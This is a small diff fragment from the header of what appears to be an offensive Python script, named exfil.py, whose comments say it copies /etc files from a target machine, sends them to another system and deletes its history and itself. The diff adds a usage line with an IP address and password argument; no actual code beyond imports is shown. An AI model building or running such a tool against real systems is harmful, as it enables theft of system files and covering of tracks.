@@ -3,6 +3,8 @@
 # python script for catting /etc files, saving them to file,
 # sending them to local system,
 # and deleting history/script from target machine.
+# 
+# usage: python3 exfil.py -i 10.0.0.1 -p 'password123'
 
 import os
 import platform
